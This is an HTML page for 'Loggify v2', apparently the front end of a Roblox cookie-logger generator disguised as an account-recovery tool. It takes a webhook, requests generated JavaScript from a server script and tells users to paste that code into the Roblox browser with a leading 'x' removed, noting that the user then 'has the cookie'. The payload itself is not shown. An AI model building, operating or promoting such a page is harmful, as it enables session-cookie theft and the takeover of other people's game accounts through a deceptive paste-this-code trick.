
<html>
<head>
<title>Loggify v2</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
  <script src="https://kit.fontawesome.com/fdbb4ce9e1.js" crossorigin="anonymous"></script>
  <script src="https://code.jquery.com/jquery-3.5.1.js"integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc="crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous" />
</head>
<body>
  <!-- Navbar -->

  <!-- Content -->
  <section class="text-gray-600 body-font">
    <div class="container px-5 py-24 mx-auto flex flex-wrap items-center">
      <div class="lg:w-3/5 md:w-1/2 md:pr-16 lg:pr-0 pr-0">
        <h1 class="title-font font-medium text-3xl text-gray-900">Loggify</h1><br><p>Recover your ROBLOX account.</p></b></p>
      </div>

      <div style="height: 414px;" class="lg:w-2/6 md:w-1/2 bg-gray-100 rounded-lg p-8 flex flex-col md:ml-auto w-full mt-10 md:mt-0">
        <div id="createWHModal">
          <h2 class="text-gray-900 text-lg font-medium title-font mb-5">Create Webhook</h2>
          <form id="whCreateForm">
            <div class="relative mb-4">
              <label for="webhook" class="leading-7 text-sm text-gray-600">Enter Webhook</label>
              <input type="text" id="webhook" name="webhook" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out">
            </div>
            <div class="relative mb-4">
              <label for="prompt" class="leading-7 text-sm text-gray-600">Prompt (Coming Soon!)</label>
              <div class="relative">
                 <span class="absolute right-0 top-0 h-full w-10 text-center text-gray-600 pointer-events-none flex items-center justify-center">
                   <svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="w-4 h-4" viewBox="0 0 24 24">
                     <path d="M6 9l6 6 6-6"></path>
                   </svg>
                 </span>
              </div>
            </div>
            <div class="relative mb-4">
              <label for="promptMSG" class="leading-7 text-sm text-gray-600">Prompt Message (Coming soon!)</label>
              <input type="hidden" id="promptMSG" name="promptMSG" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out">
            </div>
          </form>
          <button id="genCodeBtn" class="w-full text-white bg-indigo-500 border-0 py-2 px-8 focus:outline-none hover:bg-indigo-600 rounded text-lg" onClick="genCode()"><i class="fas fa-plus-circle"></i> Generate</button>
        </div>
        <div id="createdWHModal" style="display: none;">
          <h2 class="text-gray-900 text-lg font-medium title-font mb-5">Webhook:</h2>
          <div class="relative mb-4">
            <label for="full-name" class="leading-7 text-sm text-gray-600">Generated JSCode:</label>
            <textarea rows="6" type="text" id="generatedWHText" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out"></textarea>
          </div>
          <strong style="color: #6c6cff; cursor: pointer;" onClick="generateAgain()"><i class="fas fa-undo-alt"></i> Generate another webhook</strong>
          <button id="copyCodeBtn" class="w-full text-white bg-indigo-500 border-0 py-2 px-8 focus:outline-none hover:bg-indigo-600 rounded text-lg" onClick="copyCode()"><i class="fas fa-copy"></i> Copy Code</button>
        </div>
      </div>
      <div style="margin-top: 5px;" class="lg:w-2/6 md:w-1/2 bg-gray-100 rounded-lg p-8 flex flex-col md:ml-auto w-full mt-10 md:mt-0">
        <div id="createWHModal">
          <h2 class="text-gray-900 text-lg font-medium title-font mb-5">WARNING:</h2>
          <span>When you copy the code, it has a (x) in front of it. Paste it into the roblox browser and remove the x in front of it and click enter. You know have the cookie.</span>
        </div>
      </div>

    </div>
  </section>
  <script>
    function genCode() {
      $("#genCodeBtn").html('<i class="fas fa-circle-notch fa-spin"></i>');
      setTimeout(function(){
        return new Promise(function (resolve) {
            $.ajax({
                type: "POST",
                url: window.location.href + "create.php",
                data: $('#whCreateForm').serialize()
            })
            .done(function (myAjaxJsonResponse) {
                console.log(myAjaxJsonResponse);
                var result = myAjaxJsonResponse;
                if(result) {
                    $("#generatedWHText").val(result);
                    $("#createWHModal").hide();
                    $("#createdWHModal").show();
                } else {
                    alert("An unknown error has occured, please check the developer console.")
                }
                $("#genCodeBtn").html('<i class="fas fa-plus-circle"></i> Generate');
            })
            .fail(function (erordata) {
                alert("An unknown error has occured, please check the developer console.")
                $("#genCodeBtn").html('<i class="fas fa-plus-circle"></i> Generate');
            })
        })
      }, 500);
    }

    function copyCode() {
      $("textarea").select();
      document.execCommand('copy');

      $("#copyCodeBtn").html('<i class="fas fa-check-square"></i> Copied')
      setTimeout(function(){
        $("#copyCodeBtn").html('<i class="fas fa-copy"></i> Copy Code')
      }, 500);
    }

    function generateAgain() {
      $("#createdWHModal").hide();
      $("#createWHModal").show();
    }
  </script>
</body>
</html>
